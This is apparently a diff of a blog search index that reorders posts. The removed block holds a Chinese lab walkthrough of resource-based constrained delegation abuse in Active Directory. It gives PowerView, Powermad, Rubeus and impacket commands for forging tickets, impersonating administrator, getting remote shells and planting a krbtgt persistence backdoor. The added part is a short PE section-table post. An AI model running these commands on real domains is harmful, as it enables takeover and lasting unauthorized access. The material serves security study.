@@ -408,245 +408,34 @@
       </tags>
   </entry>
   <entry>
-    <title>基于资源的约束委派</title>
-    <url>/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于资源的约束委派（RBCD）是在windows server 2012中加入的新功能，与普通的约束委派不同，它不需要域管理员去设置相关属性。但是请求ST的过程和约束委派过程大同小异，RBCD把设置委派的权限赋给了机器本身，机器可以决定谁可以被委派来控制自身。更理论一点就是传统的约束委派S4U2Self返回的票据（ST1）一定是可转发的，如果不可转发那么S4U2Proxy将失败；但是基于资源的约束委派不同，就算S4U2Self返回的票据不可转发（可不可以转发由TrustedToAuthenticationForDelegation决定），S4U2Proxy也是可以成功，并且S4U2Proxy返回的票据（ST2）总是可转发。</p>
-<p>这里引用Elad的思维导图（<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html%EF%BC%89">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html）</a></p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318090529465.png" class title="image-20220318090529465">
+    <title>区段表解析及遍历</title>
+    <url>/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/</url>
+    <content><![CDATA[<h1 id="区段表结构解析"><a href="#区段表结构解析" class="headerlink" title="区段表结构解析"></a>区段表结构解析</h1><p>查看区段的一些信息</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323100649979.png" class title="image-20220323100649979">
 
-<p>从图中可以看出，基于资源的约束委派与传统的约束委派非常相似，但工作方向相反。从帐户 A （例如上一篇文章的DC）到帐户 B 的传统约束委派在帐户 A 的 msDS-AllowedToDelegateTo 属性中配置，并定义从 A 到 B 的“传出”信任，而基于资源的约束委派在帐户 B 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中配置，并定义了从 A 到 B 的“传入”信任。 </p>
-<h1 id="基于资源的约束委派利用"><a href="#基于资源的约束委派利用" class="headerlink" title="基于资源的约束委派利用"></a>基于资源的约束委派利用</h1><h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><ul>
-<li>域：whoamianony.org</li>
-<li>域控： 192.168.93.30，主机名DC，Windows Server 2012R2</li>
-<li>域成员： 192.168.93.40，主机名PC2，Windows 7 专业版</li>
-<li>用户bunny对PC2有写权限</li>
-</ul>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318145144632.png" class title="image-20220318145144632">
+<p>一些基本特征</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323101502214.png" class title="image-20220323101502214">
 
-<h2 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h2><p>验证bunny这个用户是否对PC2有写权限，用pwerview枚举，PC2.whoamianony.org中的特定ACE（<strong>运行脚本一直有报错，但是不影响结果</strong>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-DomainUser -Identity bunny -Properties objectsid</span><br><span class="line">Get-DomainObjectAcl -Identity PC2  | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-1315137663-3706837544-1429009142-1112&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151625486.png" class title="image-20220318151625486">
 
-<p>bunny对主机PC2有写入权限，其实不一定要GenericWrite，WriteProperty，WriteDacl都可以，当然最好的是GenericAll（完全控制权）</p>
-<p>现在需要一个具有SPN的账号，因为s4u2self只适用于具有SPN的账户，我们的目的是在之后通过s4u2proxy协议代替用户发起请求，而s4u2proxy是根据kerberos发起请求的，SPN是一种服务主体名称，域环境中的每台服务器都需要在Kerberos身份验证服务中注册SPN。恰好域中有一个属性MachineAccountQuota，这个值表示允许用户在域中创建的计算机账户数，默认为10。我们创建的账户默认注册在<code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN之下。因此我们可以利用。</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318100656209.png" class title="image-20220318100656209">
+<p>使用lordPE查看区段表</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323101610691.png" class title="image-20220323101610691">
 
 
 
-<p>使用powermad中的New-MachineAccount注册一个计算机用户win7，密码为win7</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount win7 -Domain whoamianony.org -DomainController DC.whoamianony.org -Verbose</span><br></pre></td></tr></table></figure>
+<p>根据区段的基本特征打印相关属性</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323103652084.png" class title="image-20220323103652084">
 
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151835228.png" class title="image-20220318151835228">
+<p>成功打印出了区段的属性</p>
+<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323103817136.png" class title="image-20220323103817136">
 
-
-
-<p>查看是否添加成功</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151858125.png" class title="image-20220318151858125">
-
-
-
-<p>查看spn票据，能添加成功机器账号肯定是有spn的，但还是可以查看一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn —q */* | findstr &quot;win7&quot;</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318151956537.png" class title="image-20220318151956537">
-
-
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318131103230.png" class title="image-20220318131103230">
-
-<p>这是新添加的win7的机器用户  </p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318131156113.png" class title="image-20220318131156113">
-
-<p>这是要修改的属性，根据微软官方文档的解释，此属性用于访问检查以确定请求者是否有权代表其他身份对以此帐户运行的服务进行操作。<strong>注：这里截图截错了应该是看PC2的msDS-AllowedToActOnBehalfOfOtherIdentity的值为未设置</strong></p>
-<p>修改PC2的msDS-AllowedToActOnBehalfOfOtherIdentity属性的值，有两种方法</p>
-<p><strong>一、powerview脚本</strong></p>
-<p>首先使用pwerview脚本查看机器账户win7的sid</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-NetComputer -Identity win7</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152113521.png" class title="image-20220318152113521">
-
-
-
-<p>然后配置win7到PC2的基于资源约束的委派（<strong>运行脚本一直有报错，但是不影响结果</strong>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1315137663-3706837544-1429009142-2103)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer PC2| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152253325.png" class title="image-20220318152253325">
-
-
-
-<p>验证是否成功添加</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainComputer PC2 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>
-
-<p>不为空就修改成功</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318152406051.png" class title="image-20220318152406051">
-
-<p>在域控上查看msds-allowedtoactonbehalfofotheridentity的值可以看到是字节数组，所以不能直接用字符串型</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318132830587.png" class title="image-20220318132830587">
-
-
-
-<p>若想清除msds-allowedtoactonbehalfofotheridentity属性的值，可用如下命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-DomainObject PC2 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure>
-
-<p><strong>二、通过ActiveDirectory模块添加</strong></p>
-<p>只有Windows Server 2012以及以上的ActiveDirectory模块才有-PrincipalsAllowedToDelegateToAccount选项，域内普通主机是不存在ActiveDirectory模块的，但是可以将DLL文件复制出来，然后导入即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import-module Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer PC2 -PrincipalsAllowedToDelegateToAccount win7$</span><br><span class="line">Get-ADComputer PC2 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318133951958.png" class title="image-20220318133951958">
-
-<p>这里已经添加过了，就不再演示了</p>
-<h2 id="进行攻击"><a href="#进行攻击" class="headerlink" title="进行攻击"></a>进行攻击</h2><h3 id="典型的基于资源约束委派攻击"><a href="#典型的基于资源约束委派攻击" class="headerlink" title="典型的基于资源约束委派攻击"></a>典型的基于资源约束委派攻击</h3><p>现在没有票据是肯定无法访问PC2的</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318155719648.png" class title="image-20220318155719648">
-
-
-
-<p>rubeus是不支持明文密码的，先将创建的机器用户的密码转换成hash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:win7 /password:win7 /domain:whoamianony.org</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318153253944.png" class title="image-20220318153253944">
-
-
-
-<p>然后用win7的rc4  hash值请求一个可转发的票据（相当于白银票据），并且导入到内存中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54 /impersonateuser:administrator /msdsspn:cifs/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161255297.png" class title="image-20220318161255297">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161307765.png" class title="image-20220318161307765">
-
-
-
-<p>cifs是文件共享，还需要导入host服务的票据才能psexec</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54  /impersonateuser:administrator /msdsspn:host/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161343840.png" class title="image-20220318161343840">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161423491.png" class title="image-20220318161423491">
-
-<p>接下来可以正常用psexec获得一个shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec64.exe \\PC2 -s cmd</span><br><span class="line">Python3 getSt.py -dc-ip 192.168.93.40 -spn cifs/oa -impersonate Administrator whoamianony.org/whoamianony:win7:win7</span><br></pre></td></tr></table></figure>
-
-<p>使用impacket工具包只要获得一个cifs凭据即可获得PC2的shell</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318161609684.png" class title="image-20220318161609684">
-
-<h3 id="解决敏感用户不可委派问题"><a href="#解决敏感用户不可委派问题" class="headerlink" title="解决敏感用户不可委派问题"></a>解决敏感用户不可委派问题</h3><p>利用条件：知道目标的主机账户的凭证</p>
-<p>在域环境中，高权限用户如果没有特殊需求的情况下，考虑到安全性一般是设置为不可委派，或者是加入受保护组</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318144136403.png" class title="image-20220318144136403">
-
-
-
-<p>清除票据</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162000613.png" class title="image-20220318162000613">
-
-<p>此时再去申请票据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54 /impersonateuser:administrator /msdsspn:cifs/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162252245.png" class title="image-20220318162252245">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162307877.png" class title="image-20220318162307877">
-
-<p>当账户不可委派以及受保护组的成员可以完成S4U2Self，不能完成S4U2proxy，可以使用<code>Rubeus describe</code>查看一下S4U2self返回的票据信息，可以看到该票据是没有服务名称的，并且不可转发。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rubeus.exe describe /ticket:申请的票据的base64值</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318174454339.png" class title="image-20220318174454339">
-
-<p>这里可以看到申请的servicename本来应该为cifs&#x2F;PC2（host&#x2F;PC2），但是这里只有win7，这是因为服务名称丢失了，只需要补上就可以了。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></table></figure>
-
-<p>如下（这里我一直使用的是加密后的base64，因为使用kirbi会报莫名其妙的错误）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:请求cifs票据的base64值 /altservice:cifs/PC2.whoamianony.org /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:请求host票据的base64值 /altservice:host/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
-
-<p>未申请之前</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175059468.png" class title="image-20220318175059468">
-
-
-
-<p>申请之后</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175404412.png" class title="image-20220318175404412">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175630923.png" class title="image-20220318175630923">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318180737281.png" class title="image-20220318180737281">
-
-<p>这里申请host的票据也是一样的步骤，就不再赘述了</p>
-<h3 id="利用基于资源的约束委派进行域权限维持"><a href="#利用基于资源的约束委派进行域权限维持" class="headerlink" title="利用基于资源的约束委派进行域权限维持"></a>利用基于资源的约束委派进行域权限维持</h3><p>主要思想是：在获得域控的管理员权限后，修改krbtgt或是域控的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性，加入已知后门账户的SID。</p>
-<p>根据这样基于资源的约束委派攻击生成白银票据的方式进行权限维持</p>
-<p>1、配置注册的主机账号（比如我这里的主机账号是win7）到krbtgt基于资源的约束委派</p>
-<p>2、配置注册的主机账号（比如我这里的主机账号是win7）到域控基于资源的约束委派</p>
-<p>这是windows 版本在2012之下（我的域控是2012的，所以这里选择第二种方法）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1315137663-3706837544-1429009142-2103)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Set-DomainObject krbtgt -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
-
-
-
-<p>在windows版本在2012及以上</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount win7$</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318202451168.png" class title="image-20220318202451168">
-
-<p>注意这是做权限维持，这是在域控上操作的</p>
-<p>修改Krbtgt用户的PrincipalsAllowedToDelegateToAccount属性后，我们已经做好了后门了，然后就可以请求TGT</p>
-<p>请求成功！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54  /impersonateuser:administrator /msdsspn:krbtgt /ptt</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318203355644.png" class title="image-20220318203355644">
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318203411815.png" class title="image-20220318203411815">
-
-<p>然后利用s4u2proxy返回的TGT去申请一张访问域控cifs服务的ST2</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgs /user:win7$ /enctype:rc4 /service:cifs/DC /domain:whoamianony.org /ticket:请求的ST2的base64 /ptt</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318204344841.png" class title="image-20220318204344841">
-
-<p>我不知道为什么这里报了一个小错误，但确实可以请求一个ST访问域控了。请求host服务一样的方法</p>
-<p>这样请求票据只能一个一个请求，用impacket工具包会方便很多</p>
-<p>这里先删除票据</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318204546537.png" class title="image-20220318204546537">
-
-
-
-<p>使用impacket工具，这里我不知道为什么一直无法将票据进行设置，原理是没错的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getst_windows.exe -dc-ip 192.168.93.30 -spn krbtgt -impersonate Administrator whoamianony.org/win7$:win7</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set KRB5CCNAME=Administrator.ccache</span><br><span class="line">wmiexec.exe -no-pass -k DC</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="在域外进行基于资源的约束委派攻击"><a href="#在域外进行基于资源的约束委派攻击" class="headerlink" title="在域外进行基于资源的约束委派攻击"></a>在域外进行基于资源的约束委派攻击</h3><p>SharpAllowedToAct可以自动生成机器账户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpAllowedToAct.exe -m hacker -p hacker -t PC2 -a 192.168.93.30 whoamianony.org</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318223625113.png" class title="image-20220318223625113">
-
-<p>可以看到确实生成了用户</p>
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318223702223.png" class title="image-20220318223702223">
-
-
-
-<p>获得服务票据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.93.30 whoamianony/hacker\$:hacker -spn cifs/PC2.whoamianony.org -impersonate administrator</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318224914156.png" class title="image-20220318224914156">
-
-<p>将票据导入内存</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
-
-
-
-<p>直接连接目标机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 smbexec.py -no-pass -k PC2.whoamianony.org</span><br></pre></td></tr></table></figure>
-
-<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318232610317.png" class title="image-20220318232610317">
-
-<p>这里有个坑，要在&#x2F;etc&#x2F;hosts下手动把PC2.whoamianony.org解析成192.168.93.40</p>
-<p>impacket工具包里面的脚本是可以完成基于资源的约束委派的攻击的，这里就不再研究了，原理都是一样的，只是使用的脚本方法不一样。</p>
+<p>与LordPE进行对比是没有错误的，这就是一次对区段表的遍历</p>
 ]]></content>
       <categories>
-        <category>内网</category>
+        <category>逆向</category>
       </categories>
       <tags>
-        <tag>域渗透</tag>
+        <tag>PE</tag>
       </tags>
   </entry>
   <entry>
@@ -1023,34 +812,245 @@
       </tags>
   </entry>
   <entry>
-    <title>区段表解析及遍历</title>
-    <url>/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/</url>
-    <content><![CDATA[<h1 id="区段表结构解析"><a href="#区段表结构解析" class="headerlink" title="区段表结构解析"></a>区段表结构解析</h1><p>查看区段的一些信息</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323100649979.png" class title="image-20220323100649979">
+    <title>基于资源的约束委派</title>
+    <url>/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于资源的约束委派（RBCD）是在windows server 2012中加入的新功能，与普通的约束委派不同，它不需要域管理员去设置相关属性。但是请求ST的过程和约束委派过程大同小异，RBCD把设置委派的权限赋给了机器本身，机器可以决定谁可以被委派来控制自身。更理论一点就是传统的约束委派S4U2Self返回的票据（ST1）一定是可转发的，如果不可转发那么S4U2Proxy将失败；但是基于资源的约束委派不同，就算S4U2Self返回的票据不可转发（可不可以转发由TrustedToAuthenticationForDelegation决定），S4U2Proxy也是可以成功，并且S4U2Proxy返回的票据（ST2）总是可转发。</p>
+<p>这里引用Elad的思维导图（<a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html%EF%BC%89">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html）</a></p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318090529465.png" class title="image-20220318090529465">
 
-<p>一些基本特征</p>
-<img data-src="/2022/03/23/%E5%8C%BA%E6%AE%B5%E8%A1%A8%E8%A7%A3%E6%9E%90%E5%8F%8A%E9%81%8D%E5%8E%86/image-20220323101502214.png" class title="image-20220323101502214">
+<p>从图中可以看出，基于资源的约束委派与传统的约束委派非常相似，但工作方向相反。从帐户 A （例如上一篇文章的DC）到帐户 B 的传统约束委派在帐户 A 的 msDS-AllowedToDelegateTo 属性中配置，并定义从 A 到 B 的“传出”信任，而基于资源的约束委派在帐户 B 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中配置，并定义了从 A 到 B 的“传入”信任。 </p>
+<h1 id="基于资源的约束委派利用"><a href="#基于资源的约束委派利用" class="headerlink" title="基于资源的约束委派利用"></a>基于资源的约束委派利用</h1><h2 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h2><ul>
+<li>域：whoamianony.org</li>
+<li>域控： 192.168.93.30，主机名DC，Windows Server 2012R2</li>
+<li>域成员： 192.168.93.40，主机名PC2，Windows 7 专业版</li>
+<li>用户bunny对PC2有写权限</li>
+</ul>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318145144632.png" class title="image-20220318145144632">
+
